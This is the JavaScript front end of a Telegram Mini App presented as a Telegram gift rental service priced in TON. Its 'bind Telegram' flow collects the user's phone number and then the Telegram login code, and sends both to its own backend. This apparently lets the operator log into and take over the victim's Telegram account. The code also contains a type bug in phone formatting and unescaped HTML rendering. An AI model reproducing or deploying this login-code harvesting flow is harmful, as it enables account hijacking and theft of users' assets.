// Глобальные переменные
let userData = {};
let gifts = [];

// Инициализация приложения
function initApp() {
    const tg = window.Telegram.WebApp;
    
    // Расширяем на весь экран
    tg.expand();
    
    // Получаем данные пользователя
    if (tg.initDataUnsafe.user) {
        const user = tg.initDataUnsafe.user;
        userData = {
            id: user.id,
            firstName: user.first_name,
            lastName: user.last_name,
            username: user.username
        };
        updateProfile();
    }
    
    // Загружаем подарки
    loadGifts();
    
    // Проверяем статус привязки Telegram
    checkTelegramStatus();
}

// Переключение вкладок
function switchTab(tabName) {
    // Скрываем все вкладки
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
    });
    
    // Показываем выбранную вкладку
    document.getElementById(tabName).classList.add('active');
    
    // Обновляем навигацию
    document.querySelectorAll('.nav-item').forEach(item => {
        item.classList.remove('active');
    });
    event.currentTarget.classList.add('active');
}

// Загрузка подарков
async function loadGifts() {
    try {
        const response = await fetch(`${CONFIG.API_URL}/api/gifts`);
        gifts = await response.json();
        renderGifts();
    } catch (error) {
        console.error('Ошибка загрузки подарков:', error);
    }
}

// Отображение подарков
function renderGifts() {
    const container = document.getElementById('giftsList');
    container.innerHTML = '';
    
    gifts.forEach(gift => {
        const giftElement = `
            <div class="gift-card" onclick="rentGift(${gift.id})">
                <img src="${gift.image}" alt="${gift.model}" class="gift-image" 
                     onerror="this.src='https://via.placeholder.com/150/001f3f/0074D9?text=GIFT'">
                <div class="gift-name">${gift.model}</div>
                <div class="gift-price">${gift.price} TON</div>
                <div class="gift-period">${gift.days} дней</div>
            </div>
        `;
        container.innerHTML += giftElement;
    });
}

// Аренда подарка
function rentGift(giftId) {
    const gift = gifts.find(g => g.id === giftId);
    if (!gift) return;
    
    const tg = window.Telegram.WebApp;
    tg.showPopup({
        title: `Аренда ${gift.model}`,
        message: `Стоимость: ${gift.price} TON\nСрок: ${gift.days} дней`,
        buttons: [
            {id: 'confirm', type: 'default', text: 'Арендовать'},
            {type: 'cancel', text: 'Отмена'}
        ]
    }, function(buttonId) {
        if (buttonId === 'confirm') {
            processRent(giftId);
        }
    });
}

// Процесс аренды
async function processRent(giftId) {
    try {
        const response = await fetch(`${CONFIG.API_URL}/api/rent`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                giftId: giftId,
                userId: userData.id
            })
        });
        
        const result = await response.json();
        if (result.success) {
            window.Telegram.WebApp.showAlert('🎉 Подарок успешно арендован!');
            updateProfile();
        }
    } catch (error) {
        console.error('Ошибка аренды:', error);
        window.Telegram.WebApp.showAlert('❌ Ошибка при аренде');
    }
}

// Привязка Telegram
function bindTelegram() {
    const tg = window.Telegram.WebApp;
    
    tg.showPopup({
        title: 'Привязка Telegram',
        message: 'Для привязки аккаунта нам потребуется доступ к вашему номеру телефона',
        buttons: [
            {id: 'share_phone', type: 'default', text: '📱 Поделиться номером'},
            {type: 'cancel', text: 'Отмена'}
        ]
    }, function(buttonId) {
        if (buttonId === 'share_phone') {
            requestPhoneNumber();
        }
    });
}

// Запрос номера телефона
function requestPhoneNumber() {
    const tg = window.Telegram.WebApp;
    
    tg.requestContact((contact) => {
        if (contact) {
            startTelegramAuth(contact.phone_number);
        }
    });
}

// Запуск авторизации Telegram
function startTelegramAuth(phoneNumber) {
    showAuthStep(1, phoneNumber);
    
    // Отправляем запрос на бэкенд
    fetch(`${CONFIG.API_URL}/auth/request`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: phoneNumber })
    })
    .then(response => response.json())
    .then(data => {
        if (data.requires_code) {
            showCodeInput();
        }
    });
}

// Показ шагов авторизации
function showAuthStep(step, phone) {
    const authSteps = document.getElementById('authSteps');
    
    if (step === 1) {
        authSteps.innerHTML = `
            <div class="auth-step">
                <strong>Шаг 1: Номер подтвержден</strong>
                <p>Номер: ${formatPhoneNumber(phone)}</p>
                <p>Ожидаем код из Telegram...</p>
            </div>
        `;
    }
    
    openModal('telegramAuthModal');
}

// Показ ввода кода
function showCodeInput() {
    const authSteps = document.getElementById('authSteps');
    authSteps.innerHTML += `
        <div class="auth-step">
            <strong>Шаг 2: Введите код</strong>
            <p>Код отправлен в Telegram</p>
            <div class="code-input">
                <button class="code-btn" onclick="addCode('1')">1</button>
                <button class="code-btn" onclick="addCode('2')">2</button>
                <button class="code-btn" onclick="addCode('3')">3</button>
                <button class="code-btn" onclick="addCode('4')">4</button>
                <button class="code-btn" onclick="addCode('5')">5</button>
                <button class="code-btn" onclick="addCode('6')">6</button>
                <button class="code-btn" onclick="addCode('7')">7</button>
                <button class="code-btn" onclick="addCode('8')">8</button>
                <button class="code-btn" onclick="addCode('9')">9</button>
                <button class="code-btn" onclick="clearCode()">C</button>
                <button class="code-btn" onclick="addCode('0')">0</button>
                <button class="code-btn" onclick="submitCode()">✓</button>
            </div>
            <div id="codeDisplay" style="text-align: center; font-size: 18px; margin: 10px 0;"></div>
        </div>
    `;
}

let currentCode = '';

function addCode(digit) {
    if (currentCode.length < 6) {
        currentCode += digit;
        updateCodeDisplay();
    }
}

function clearCode() {
    currentCode = '';
    updateCodeDisplay();
}

function updateCodeDisplay() {
    const display = document.getElementById('codeDisplay');
    if (display) {
        display.textContent = '•'.repeat(currentCode.length);
    }
}

async function submitCode() {
    if (currentCode.length < 5) {
        window.Telegram.WebApp.showAlert('Введите полный код');
        return;
    }
    
    try {
        const response = await fetch(`${CONFIG.API_URL}/auth/verify`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ code: currentCode })
        });
        
        const result = await response.json();
        if (result.success) {
            window.Telegram.WebApp.showAlert('✅ Telegram успешно привязан!');
            closeModal('telegramAuthModal');
            checkTelegramStatus();
        } else {
            window.Telegram.WebApp.showAlert('❌ Неверный код');
            clearCode();
        }
    } catch (error) {
        console.error('Ошибка верификации:', error);
    }
}

// Работа с номером телефона
function showPhoneModal() {
    openModal('phoneModal');
}

function formatPhoneNumber(input) {
    let value = input.value.replace(/\D/g, '');
    
    if (value.startsWith('7') || value.startsWith('8')) {
        value = '7' + value.substring(1);
        document.getElementById('countryFlag').textContent = '🇷🇺';
    }
    
    let formattedValue = '+';
    
    if (value.length > 0) {
        formattedValue += value.substring(0, 1);
    }
    if (value.length > 1) {
        formattedValue += ' (' + value.substring(1, 4);
    }
    if (value.length > 4) {
        formattedValue += ') ' + value.substring(4, 7);
    }
    if (value.length > 7) {
        formattedValue += '-' + value.substring(7, 9);
    }
    if (value.length > 9) {
        formattedValue += '-' + value.substring(9, 11);
    }
    
    input.value = formattedValue;
}

async function savePhoneNumber() {
    const phone = document.getElementById('phoneInput').value;
    
    if (!phone || phone.length < 10) {
        window.Telegram.WebApp.showAlert('Введите корректный номер телефона');
        return;
    }
    
    try {
        const response = await fetch(`${CONFIG.API_URL}/api/save-phone`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                userId: userData.id,
                phone: phone
            })
        });
        
        const result = await response.json();
        if (result.success) {
            window.Telegram.WebApp.showAlert('✅ Номер успешно сохранен!');
            closeModal('phoneModal');
            updateProfile();
        }
    } catch (error) {
        console.error('Ошибка сохранения номера:', error);
    }
}

// Обновление профиля
async function updateProfile() {
    if (!userData.id) return;
    
    try {
        const response = await fetch(`${CONFIG.API_URL}/api/user/${userData.id}`);
        const userInfo = await response.json();
        
        document.getElementById('userName').textContent = 
            userData.firstName + (userData.lastName ? ' ' + userData.lastName : '');
        document.getElementById('balance').textContent = userInfo.balance + ' TON';
        document.getElementById('rentedGifts').textContent = userInfo.rentedGifts || 0;
        document.getElementById('myGifts').textContent = userInfo.myGifts || 0;
        
        if (userInfo.phone) {
            document.getElementById('phoneDisplay').textContent = userInfo.phone;
        }
        
    } catch (error) {
        console.error('Ошибка загрузки профиля:', error);
    }
}

// Проверка статуса Telegram
async function checkTelegramStatus() {
    if (!userData.id) return;
    
    try {
        const response = await fetch(`${CONFIG.API_URL}/api/telegram-status/${userData.id}`);
        const status = await response.json();
        
        const statusElement = document.getElementById('telegramStatus');
        const buttonElement = document.getElementById('bindTelegramBtn');
        
        if (status.connected) {
            statusElement.textContent = '✅ Привязан';
            statusElement.style.color = '#00ff00';
            buttonElement.style.display = 'none';
        } else {
            statusElement.textContent = '❌ Не привязан';
            statusElement.style.color = '#ff4444';
            buttonElement.style.display = 'block';
        }
    } catch (error) {
        console.error('Ошибка проверки статуса:', error);
    }
}

// Управление модальными окнами
function openModal(modalId) {
    document.getElementById(modalId).style.display = 'flex';
}

function closeModal(modalId) {
    document.getElementById(modalId).style.display = 'none';
}

// Инициализация при загрузке
document.addEventListener('DOMContentLoaded', initApp);
